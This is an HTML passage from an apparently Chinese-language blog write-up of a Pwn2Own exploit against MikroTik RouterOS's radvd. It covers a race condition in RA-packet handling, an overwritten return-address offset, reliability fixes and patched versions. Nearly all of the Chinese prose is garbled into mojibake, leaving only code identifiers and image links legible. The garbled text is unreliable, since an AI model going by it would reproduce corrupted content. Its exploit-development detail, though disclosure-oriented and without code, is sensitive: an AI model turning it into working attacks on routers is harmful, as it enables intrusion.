&lt;p&gt;Â∞±Âú®ÊàëÂÄëË¶∫Âæó $100,000 ÁöÑÁçéÈáëÂ∑≤Á∂ìÂà∞ÊâãÁöÑÊôÇÂÄôÔºå‰∏çÂèØÊÄùË≠∞ÁöÑ‰∫ãÊÉÖÁôºÁîü‰∫ÜÔºåÈÇ£Â∞±ÊòØÊàëÂÄëÁöÑÊîªÊìäÂè™Ë¶ÅÂú® Ubuntu ‰∏äÂü∑Ë°åÂ∞±ÊúÉÂ§±ÊïóÔºå‰∏çÁÆ°ÈÄôÂÄã Ubuntu Á≥ªÁµ±ÊòØÂú® MacOS ÂÖßÁöÑ‰∏ÄÂè∞ËôõÊì¨Ê©üÂô®ÂèàÊàñËÄÖÊòØ‰∏ÄÂè∞ Ubuntu ÂØ¶Ê©üÔºõËÄå Pwn2Own ÂÆòÊñπÔºåÂü∫Êú¨‰∏äÊòØ‰ΩøÁî® Ubuntu ‰æÜÂü∑Ë°åÊàëÂÄëÁöÑ exploitÔºåÊâÄ‰ª•ÊàëÂÄëÂøÖÈ†àË¶ÅËß£Ê±∫ÈÄôÂÄãÂïèÈ°å„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/54.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÊàëÂÄëÂòóË©¶Âú® MacOS ‰∏äÂü∑Ë°å exploit ‰∏¶‰∏îÁ¥ÄÈåÑÁ∂≤Ë∑ØÂ∞ÅÂåÖÔºåÁÑ∂ÂæåÂú® Ubuntu ‰∏äÈáçÊîæÊµÅÈáèÔºåÂèØ‰ª•ËßÄÂØüÂà∞ÈáçÊîæÊúÉÂ§±ÊïóÔºö&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/55.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÊàëÂÄë‰πüÂòóË©¶Âú® Ubuntu ‰∏äÂü∑Ë°å exploit ‰∏¶‰∏îË®òÈåÑÁ∂≤Ë∑ØÂ∞ÅÂåÖÔºåÁï∂ÁÑ∂Âú® Ubuntu ‰∏äÊòØÂ§±ÊïóÁöÑÔºå‰ΩÜÁï∂ÊàëÂÄëÂú® MacOS ÈáçÊîæÂ§±ÊïóÁöÑÊµÅÈáèÊôÇÔºå‰ªñÁ´üÁÑ∂ÊàêÂäü‰∫ÜÔºö&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/56.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Âà∞ÈÄôË£°ÊàëÂÄëÁåúÊ∏¨ÂèØËÉΩÊòØÂÖ∂‰∏≠‰∏ÄÂÄã OS Âú®ÈÄÅÂá∫Â∞ÅÂåÖ‰πãÂâçÊúÉÂ∞çÂ∞ÅÂåÖÈÄ≤Ë°åÈáçÊñ∞ÊéíÂ∫èÔºåËÄåÈáçÊñ∞ÊéíÂ∫èÁöÑÈÄôÂÄãË°åÁÇ∫ÊàñË®±Âú® wireshark Êì∑ÂèñÂà∞Â∞ÅÂåÖ‰πãÂæåÔºåÊâÄ‰ª•ÊâçÊ≤íË¢´ wireshark Á¥ÄÈåÑÂà∞„ÄÇÂõ†Ê≠§ÊàëÂÄëÁõ¥Êé•ÂØ´‰∫Ü‰∏ÄÂÄã sniffer ÊîæÂú® router ‰∏äÈù¢‰æÜÁõ£ÊéßÊµÅÈáèÔºå‰∏îÂõ†ÁÇ∫ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AF_PACKET&lt;/code&gt; È°ûÂûãÁöÑ socket ‰∏çÊúÉË¢´Èò≤ÁÅ´ÁâÜË¶èÂâáÂΩ±ÈüøÔºåÁµêÊûúÊáâË©≤Ë¶ÅÈùûÂ∏∏ÂèØÈù†Ôºö
&lt;img src=&quot;/assets/img/blog/20240524/57.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÁÑ∂ËÄåÔºåÂæûÂÖ©ÈÇäÈåÑÂà∞ÁöÑÂ∞ÅÂåÖÊ†πÊú¨&lt;strong&gt;‰∏ÄÊ®°‰∏ÄÊ®£&lt;/strong&gt;‚Ä¶‚Ä¶&lt;/p&gt;

&lt;p&gt;ÊâÄ‰ª•Ôºåexploit ÁõÆÂâçÂè™Âú®ÊàëÁöÑ MacOS ‰∏äÊàêÂäüÈÅéÔºåÂ¶ÇÊûúÁãÄÊ≥Å‰∏çËß£Ê±∫ÔºåÂîØ‰∏ÄÁöÑÊñπÊ≥ïÂ∞±ÊòØÊàëÂ∏∂ËëóÊàëÁöÑ Mac Á≠ÜÈõªÈ£õÂéªÂ§öÂÄ´Â§öÔºåÂú®ÁèæÂ†¥Áî®ÊàëËá™Â∑±ÁöÑÁ≠ÜÈõªÈÄ≤Ë°åÊîªÊìä„ÄÇ‰ΩÜÊàëÂÄë‰∏çÂèØËÉΩÊîæËëóÈÄôÂÄãÊàêÂõ†‰∏çÊòéÁöÑÂïèÈ°å‰∏çÁÆ°ÔºåË™∞Áü•ÈÅìÊúÉ‰∏çÊúÉÂú®ÊØîË≥Ω‰∏≠‰πüÁôºÁîüÂú®ÊàëÁöÑÁ≠ÜÈõª‰∏äÔºåÂ¶ÇÊûúÁúüÁöÑÁôºÁîüÈÇ£Â∞±ËôßÂ§ß‰∫Ü„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/58.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Âú®Á∂ìÈÅéÂπæÊ¨°Ë¨πÊÖéÁöÑÂæ©Áõ§‰πãÂæåÊàëÂÄëÁµÇÊñºÁü•ÈÅìÂïèÈ°åÁöÑÊàêÂõ†‰∫Ü‚Äî‚ÄîÈÄüÂ∫¶„ÄÇÂõ†ÁÇ∫ÂÖ©ÂÄã RA Â∞ÅÂåÖÈÄÅÂá∫ÊôÇÈñìÈñìÈöî‰∏¶‰∏çÂ§ßÔºåÊâÄ‰ª•ÂæàÈõ£Âú® wireshark ÁöÑÊôÇÈñìËª∏‰∏äÁõ¥Êé•ÁúãÂá∫‰æÜÔºå‰ΩÜÂ¶ÇÊûúË®àÁÆó‰∏Ä‰∏ãÊúÉÁôºÁèæÔºåÂÖ©ÂÄãÊâÄËä±Ë≤ªÁöÑÊôÇÈñìÂÖ∂ÂØ¶&lt;strong&gt;Áõ∏Â∑Æ‰∫Ü 390 ÂÄç&lt;/strong&gt;„ÄÇÊâÄ‰ª•ÂïèÈ°å‰πü‰∏çÊòØÂá∫Âú® Ubuntu ‰∏äÔºåËÄåÊòØÂõ†ÁÇ∫ Mac ÈÄÅÂÖ©ÂÄãÂ∞ÅÂåÖÈÄÅÁöÑÂ§™Âø´Ôºå‰∏çÂ∞èÂøÉËß∏Áôº‰∫ÜÂ≠òÂú®Âú® radvd ‰∏≠ÁöÑ race conditionÔºàÂä†‰∏äÊ•µÂ∫¶Êá∂ÊÉ∞ÁöÑÊàëÊ≤íÊúâÂ•ΩÂ•ΩË®àÁÆóËìãÂà∞ return address Ë¶ÅËä±Â§öÂ∞ë bytesÔºåÁõ¥Êé•Âú®‰∏äÈù¢ÂØ´ÊªøÂûÉÂúæÁÑ∂ÂæåÂÅö pattern match ËÄåÂ∑≤ÔºåÊâÄ‰ª•ÈÄôÂÄã offset Âè™Âú® race ÁöÑÊÉÖÊ≥Å‰∏ãÊâçÊ≠£Á¢∫Ôºâ„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/59.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ëß£Ê±∫ÊñπÊ≥ïÂ∞±ÊòØÂú®ÈÄÅÂá∫ÂÖ©ÂÄã RA Â∞ÅÂåÖ‰πãÈñì sleep ‰∏Ä‰∏ãÔºå‰∏¶Êää payload ‰∏≠ÁöÑ offset ‰øÆÂæ©ÊàêÊ≤íÊúâ race ÁöÑÊÉÖÊ≥Å‰∏ãËßÄÂØüÂà∞ÁöÑ offsetÔºåÂ∞±ÂèØ‰ª•Á©©ÂÆöÊàëÂÄëÁöÑÊîªÊìäËÖ≥Êú¨ÔºåÊääÊàêÂäüÊ©üÁéáÊèêÂçáÂà∞ 100%„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;fix&quot;&gt;Fix&lt;/h3&gt;

&lt;p&gt;ÈÄôÂÄãÊºèÊ¥ûÂú®‰ª•‰∏ãÁâàÊú¨‰∏≠Â∑≤Á∂ìË¢´‰øÆÂæ©Ôºö&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Long-term Release 6.48.7&lt;/li&gt;
  &lt;li&gt;Stable Release 6.49.8, 7.10&lt;/li&gt;
  &lt;li&gt;Testing Release 7.10rc6&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ÂêåÊôÇÊàëÂÄë‰πüÁôºÁèæÈÄôÂÄãÊºèÊ¥ûÂæû RouterOS v6.0 Â∞±Â∑≤Á∂ìÂ≠òÂú®‰∫ÜÔºåÂæûÂÆòÁ∂≤ÂèØ‰ª•ÁôºÁèæ 6.0 ÁöÑÁôºÂ∏ÉÊó•ÊúüÊòØ 2013-05-20Ôºå‰πüÂ∞±ÊòØË™™ÈÄôÂÄãÊºèÊ¥ûÂ∑≤Á∂ìÂ≠òÂú®Âú®ÈÇ£Ë£°&lt;strong&gt;‰πùÂπ¥‰πã‰πÖ&lt;/strong&gt;ÔºåÂçªÊ≤íÊúâ‰∫∫ÁôºÁèæ‰ªñ„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/60.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÂëºÊáâÂà∞ÊàëÂÄë‰∏ÄÈñãÂßãÁöÑÊÉ≥Ê≥ïÔºö„ÄåÊ≤íÊúâ‰ªª‰ΩïÁêÜÊô∫Ê≠£Â∏∏ÁöÑ‰∫∫ÊÉ≥Ë¶ÅËä±ÊôÇÈñìÈÄÜÂêë nova binary„ÄçÔºåÂæóË≠â„ÄÇ&lt;/p&gt;

&lt;h2 id=&quot;the-race-condition&quot;&gt;The race condition&lt;/h2&gt;

&lt;p&gt;ÁÑ∂ËÄåÈÄôÂÄãÂ¶®Á§ôÊàëÂÄëËºïÈ¨ÜË≥∫Âèñ $100,000 ÁöÑ race condition ÊòØÊÄéÈ∫ºÁôºÁîüÁöÑÔºüÂ¶ÇÂâçÈù¢ÊâÄËø∞Ôºånova binary ‰∏≠Êúâ‰∏ÄÂÄã Looper Âæ™Áí∞Ê™¢Êü•Áï∂ÂâçÊúâ‰ªÄÈ∫º‰∫ã‰ª∂ÁôºÁîüÔºå‰πüÂ∞±ÊòØË™¨ÈÄôÊòØ‰∏ÄÂÄã single thread ÁöÑÁ®ãÂºèÔºåÈÇ£ race condition ÊòØÊÄéÈ∫ºÂõû‰∫ãÔºüÔºàÊúâ‰∫õ nova binary ÊòØ multi-fiberÔºå‰ΩÜ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; ‰∏¶‰∏çÊòØÔºâ&lt;/p&gt;

&lt;p&gt;ÈÄôÂ∞±Ë¶ÅÊèêÂà∞‰∏ÄÂÄãÂâõÊâçÊ≤íÊúâÊèêÂà∞ÁöÑÁ¥∞ÁØÄÔºåÁï∂ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; Âú®Ëß£ÊûêÂæû WAN Êî∂Âà∞ÁöÑ RA Â∞ÅÂåÖÊôÇÔºåDNS ÊòØË¢´Â≠òÂÖ•‰∏ÄÂÄã „Äåvector„Äç Áï∂‰∏≠ÔºåÁÑ∂ËÄåÂú®Ê∫ñÂÇô LAN Âª£Êí≠Áî®ÁöÑ RA Â∞ÅÂåÖÊôÇÔºå&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addDNS&lt;/code&gt; ÂçªÊòØÊää‰∏ÄÂÄãÂÑ≤Â≠ò‰∫Ü DNS ÁöÑ „Äåtree„ÄçÁµ¶Â±ïÈñãÔºåÊâÄ‰ª•ÈÄôÂÄã vector Ë∑ü tree ‰πãÈñìÊòØ‰ªÄÈ∫ºÈóú‰øÇÔºüÂèàÊòØÊÄéÈ∫ºËΩâÊèõÈÅéÂéªÁöÑÔºü&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/61.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÈÄô‰πüÊòØÁÇ∫‰ªÄÈ∫ºÊàëÂÄëÊ≤íÊúâÁ¨¨‰∏ÄÊôÇÈñìÂ∞±Âú® callback Ë£°Èù¢ÊâæÂà∞„ÄåÂæû WAN Êî∂Âà∞ RA Â∞±ÊúÉÂæÄ LAN Âª£Êí≠ RA Â∞ÅÂåÖ„ÄçÁöÑÈÇèËºØÔºåÂõ†ÁÇ∫ÈÄôÊòØÁî±ÂÖ©ÂÄã process Âú®‰∏ÄÈô£Ë§áÈõúÁöÑ‰∫íÂãï‰πãÂæåÊâÄÁî¢ÁîüÁöÑÁµêÊûú„ÄÇ&lt;/p&gt;

&lt;p&gt;ÊàëÂÄë‰ªîÁ¥∞Áúã‰∏Ä‰∏ã callback ÂÖ∑È´î‰∏äÂÅö‰∫Ü‰ªÄÈ∫ºÔºåÂèØ‰ª•ÁúãÂà∞Êúâ‰∏ÄÂÄã array Ë≤†Ë≤¨Áî®‰æÜÂ≠òÊîæ‰∏ÄÁ®ÆÂè´ÂÅö„Äå remote object„ÄçÁöÑÁâ©‰ª∂ÔºåÈÄôÊÆµÁ®ãÂºèÁ¢ºÁúãËµ∑‰æÜÂæàÁõ¥ËßÄÔºåÂ∞±ÊòØËø≠‰ª£Â≠òÊúâ DNS ÁöÑ vectorÔºåÁÑ∂ÂæåÁÇ∫ÊØèÂÄã DNS Âú∞ÂùÄÈÉΩÂëºÂè´‰∏ÄÊ¨° &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nv::roDNS&lt;/code&gt;Ôºå‰∏¶ÊääÂáΩÂºèÁöÑÂü∑Ë°åÁµêÊûú‰øùÂ≠òÂú® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DNS_remoteObject&lt;/code&gt; vector Áï∂‰∏≠„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/62.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;remote-object&quot;&gt;remote object&lt;/h3&gt;

&lt;p&gt;ÊâÄ‰ª•‰ªÄÈ∫ºÊòØ remote objectÔºüremote object ÊòØ RouterOS ‰∏≠Áî®‰æÜË∑® process ÂàÜ‰∫´Ë≥áÊ∫êÁöÑ‰∏ÄÂÄãÊ©üÂà∂Ôºö‰∏ÄÂÄã process Ë≤†Ë≤¨‰øùÂ≠òÂÖ±Áî®Ë≥áÊ∫êÔºåÁÑ∂ÂæåÂè¶Â§ñ‰∏ÄÂÄã prcoess ÂèØ‰ª•ÈÄöÈÅé id ÂêëË≤†Ë≤¨‰øùÂ≠òÁöÑ process ÁôºÈÄÅË´ãÊ±Ç‰æÜÈÄ≤Ë°åÂ¢ûÂà™Êü•Êîπ„ÄÇ ‰æãÂ¶Ç DNS remote object ÂØ¶Èöõ‰∏äÊîæÂú® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; process ‰∏≠ÁöÑ handler 2ÔºåËÄå &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; ÁöÑ handler 1 Âè™ÊòØÂñÆÁ¥î‰øùÊúâÈÄô‰∫õÁâ©‰ª∂Â∞çÊáâÁöÑ id ËÄåÂ∑≤„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/63.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;subscription-and-notification&quot;&gt;subscription and notification&lt;/h3&gt;

&lt;p&gt;Áï∂‰∏ÄÂÄã remote object Ë¢´Êõ¥Êñ∞ÊôÇÔºåÊúâ‰∫õ process ÂèØËÉΩÊúÉÊÉ≥Ë¶ÅÂÅöÂá∫Â∞çÊáâÁöÑË°åÁÇ∫ÔºåÊâÄ‰ª• nova binary ÂèØ‰ª•ÈÄèÈÅé IPC ‰∫ãÂÖàË®ÇÈñ±ÂÖ∂‰ªñ nova binary ‰∏≠ÁöÑ remote object„ÄÇ‰ª• &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dhcp&lt;/code&gt; Âèä &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ippool6&lt;/code&gt; ÁÇ∫‰æãÔºå&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ippool6&lt;/code&gt; ‰∏≠ÁöÑ handler 1  Ë≤†Ë≤¨ÁÆ°ÁêÜ ipv6 address poolÔºå&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dchp&lt;/code&gt; process ÊúÉÂéªË®ÇÈñ± &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ippool6&lt;/code&gt; ÁöÑ handler 1ÔºåÊâÄ‰ª•Áï∂ ipv6 address pool ÊúâÁï∞ÂãïÊôÇÔºådhcp ÂèØ‰ª•Ê™¢Êü•ÈúÄ‰∏çÈúÄË¶ÅÈáùÂ∞çÈÄô‰∫õÁï∞ÂãïÈÄ≤Ë°åÈÄ≤‰∏ÄÊ≠•ÁöÑËôïÁêÜÔºå‰æãÂ¶ÇÈóúÈñâÊüêÂÄã dhcp server„ÄÇ&lt;/p&gt;

&lt;p&gt;Ë®ÇÈñ±ÁöÑÈÄôÂÄãË°åÁÇ∫ÊòØÈÄèÈÅéÁôºÈÄÅ‰∏ÄÂÄãÊåá‰ª§ÁÇ∫ subscribe ÁöÑ nova message Áµ¶ÊÉ≥Ë¶ÅË®ÇÈñ±ÁöÑ binaryÔºåÁï∂‰∏≠ÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_NOTIFYCMD&lt;/code&gt; ÂåÖÂê´‰∫ÜÂÖ∑È´îÊÉ≥Ë¶ÅË¢´ÈÄöÁü•ÁöÑÁãÄÊ≥ÅÊòØ‰ªÄÈ∫º„ÄÇ
&lt;img src=&quot;/assets/img/blog/20240524/64.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÊâÄ‰ª•Âú®‰∏äËø∞ÊÉÖÊ≥Å‰∏≠ÔºåÁï∂ÊúâÂè¶Â§ñ‰∏ÄÂÄã process ÂæÄ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ippool6&lt;/code&gt; ‰∏≠Â¢ûÂä† object ÊôÇÔºåhandler 1 ÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmdAddObj&lt;/code&gt; ÂáΩÂºèÊúÉË¢´Âü∑Ë°å„ÄÇ
&lt;img src=&quot;/assets/img/blog/20240524/65.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Âú®Â§ßÈÉ®ÂàÜÊÉÖÊ≥ÅË£°Ôºå&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AddObj&lt;/code&gt; Âõ∫ÂÆöÊúÉÂéªÂëºÂè´ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sendNotifies&lt;/code&gt; ‰æÜÈÄöÁü•ÈÇ£‰∫õÊúâË®ÇÈñ± 0xfe000b ‰∫ã‰ª∂ÁöÑ subscribersÔºåÂëäË®¥‰ªñÂÄëË®ÇÈñ±ÁöÑÁâ©‰ª∂Â∑≤Ë¢´ÊîπÂãïÔºåÊâÄ‰ª• &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ippool6&lt;/code&gt; ÈÄôË£°ÊúÉÈÄÅ‰∏ÄÂÄã nova message Áµ¶ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dhcp&lt;/code&gt; processÔºåÂëäÁü•Áâ©‰ª∂Ë¢´ÊîπÂãïÂæåÁöÑÁµêÊûú„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/66.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Âú®ÁêÜËß£‰∫ÜË®ÇÈñ±Ê©üÂà∂‰πãÂæåÔºåÊàëÂÄëÂèØ‰ª•Êõ¥ÂÖ®Èù¢ÁöÑÁêÜËß£ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; Ëàá &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; ‰πãÈñìÁöÑ‰∫íÂãïÂ¶Ç‰∏ãÔºö&lt;/p&gt;

&lt;p&gt;Áï∂ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; Âæû WAN Êî∂Âà∞ RA Â∞ÅÂåÖÂæåÔºåÂÆÉÊúÉÂ∞çÊØèÂÄã IPv6 Âú∞ÂùÄÂëºÂè´ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;roDNS&lt;/code&gt; ‰æÜË´ã &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; Âª∫Á´ãÁõ∏ÈóúÁöÑ remote object„ÄÇËÄå &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; ‰∏≠ÁöÑ handler 4 ÊúÉË≤†Ë≤¨ËôïÁêÜÈÄôÂÄãË´ãÊ±ÇÔºå‰∏¶Âú® handler 2 ‰∏≠Âª∫Á´ãÂ∞çÊáâÁöÑ ipv6 objectÔºåÊé•ËëóÂõ†ÁÇ∫ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; ÁöÑ handler 1 Ë®ÇÈñ±‰∫Ü &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resovler&lt;/code&gt; ÁöÑ handler 2ÔºåÊâÄ‰ª• &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; ÁöÑ handler 2 ÊääÁõÆÂâçÊìÅÊúâÁöÑÊâÄÊúâ DNS address Êé®Êí≠Áµ¶ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; ÁöÑ handler 1ÔºåÊé•Ëëó handler 1 Â∞±‰æùÁÖß‰ªñÊî∂Âà∞ÁöÑ DNS address ÊßãÈÄ† RA Â∞ÅÂåÖÔºå‰πãÂæåÂú® LAN Âª£Êí≠Ë©≤Â∞ÅÂåÖ„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/67.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;race-condition-ÊàêÂõ†&quot;&gt;Race Condition ÊàêÂõ†&lt;/h3&gt;

&lt;p&gt;Race condition ÁöÑÂïèÈ°åÂØ¶Èöõ‰∏äÂá∫Âú® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;roDNS&lt;/code&gt; ÁöÑÂØ¶‰ΩúÔºå&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;roDNS&lt;/code&gt; ‰∏≠‰ΩøÁî® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;postMessage&lt;/code&gt; ‰æÜÁôºÈÄÅ nova messageÔºåËÄåÈÄôÂÄãÊñπÊ≥ïÊòØ non-blocking ÁöÑÔºåË°®Á§∫ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; ‰∏≠ÁöÑ remote object ‰∏¶‰∏çÊúÉÈ¶¨‰∏äÁü•ÈÅìÂÆÉÂú® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; ‰∏≠Â∞çÊáâÁöÑ id ÊòØ‰ªÄÈ∫º„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/68.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Âõ†Ê≠§Ëã•Á¨¨‰∫åÂÄãÂ∞ÅÂåÖÂ§™Âø´Âà∞ÈÅîÔºå‰ª•Ëá≥Êñº &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; ÈÇÑÁÑ°ÂæûÂæóÁü• remote object ÁöÑ id ÊòØ‰ªÄÈ∫ºÁöÑÊôÇÂÄôÔºå&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; Â∞±Ê≤íÊúâËæ¶Ê≥ïÁ¨¨‰∏ÄÊôÇÈñìÁ¢∫ÂØ¶ÁöÑÂà™Èô§ÈÄô‰∫õÁâ©‰ª∂ÔºåÂè™ËÉΩÂÖàÂ∞áÂÆÉÂÄëÊ®ôË®òÊàê destroyed ÈÄ≤Ë°åËªüÂà™Èô§ÔºåÈÄôÂ∞±ÈÄ†Êàê‰∫Ü race condition ÁöÑÁî¢Áîü„ÄÇ
&lt;img src=&quot;/assets/img/blog/20240524/69.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÊàëÂÄë‰∏ÄÊ≠•‰∏ÄÊ≠•ÁöÑÂàÜËß£Êï¥ÂÄãÊµÅÁ®ãÔºö&lt;/p&gt;

&lt;p&gt;È¶ñÂÖàÔºåÂõ†ÁÇ∫ÂÖ©ÂÄã process ÈÉΩÊòØ single threadÔºåÊàëÂÄëÂèØ‰ª•ÂÅáË®≠ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt;„ÄÅ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; ÂÖ©ÂÄã process ÁèæÂú®Ê≠£Âú®Âü∑Ë°å‰ªñÂÄëÁöÑÁ¨¨‰∏ÄÂÄã loop„ÄÇ&lt;/p&gt;

&lt;p&gt;Áï∂ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; Âæû WAN Êî∂Âà∞‰∏ÄÂÄãÂè™Êúâ‰∏ÄÂÄã DNS address ÁöÑ RA ÊôÇÔºå&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; ÊúÉÂêë &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; ÁôºÈÄÅ‰∏ÄÂÄãÂâµÂª∫ remote object ÁöÑË´ãÊ±Ç„ÄÇ
&lt;img src=&quot;/assets/img/blog/20240524/70.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ËÄå &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; Âú®Êî∂Âà∞Á¨¨‰∏ÄÂÄãË´ãÊ±ÇÁöÑÂêåÊôÇÊúÉË®≠ÂÆö‰∏ÄÂÄã timerÔºåÂõ†Áà≤Âú® IPC ÁöÑÊ©üÂà∂‰∏≠Ôºå&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; ÁÑ°Ê≥ïÁü•ÈÅìÂ§öÂ∞ëÂÄã &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AddObj&lt;/code&gt; Ë´ãÊ±ÇÂ±¨ÊñºÂêå‰∏ÄÊâπÔºåÊâÄ‰ª•ÂÆÉÈùûÂ∏∏Á∞°ÂñÆÁöÑË®≠‰∫Ü‰∏ÄÂÄã‰∏ÄÊ¨°ÊÄßÁöÑ timerÔºåÊôÇÈñìÂà∞‰∫ÜÊâçÈÄÅÂá∫‰∏ÄÊ¨° notification„ÄÇÈô§Ê≠§‰πãÂ§ñÔºåÊØèÊ¨° &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; ËôïÁêÜÂÆåÂñÆÂÄãÂâµÂª∫ÁöÑË´ãÊ±ÇÂæåÊáâË©≤Ë¶ÅÂõûÂÇ≥‰∏ÄÂÄã nova message ‰ΩúÁÇ∫ responseÔºåÈÄöÁü• &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; ÂâõÂâõË¢´Êñ∞Â¢ûÁöÑ remote object ÁöÑ id ÊòØÂ§öÂ∞ëÔºåËÄå &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; ÊúÉÈÄèÈÅéÊñπÊâçÈÄÅÂá∫Ë´ãÊ±ÇÊôÇ‰∏Ä‰ΩµË®ªÂÜäÁöÑ‰∏ÄÊ¨°ÊÄß ResponseHandler ‰æÜËôïÁêÜÈÄôÂÄãÂõûÊáâ„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/71.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

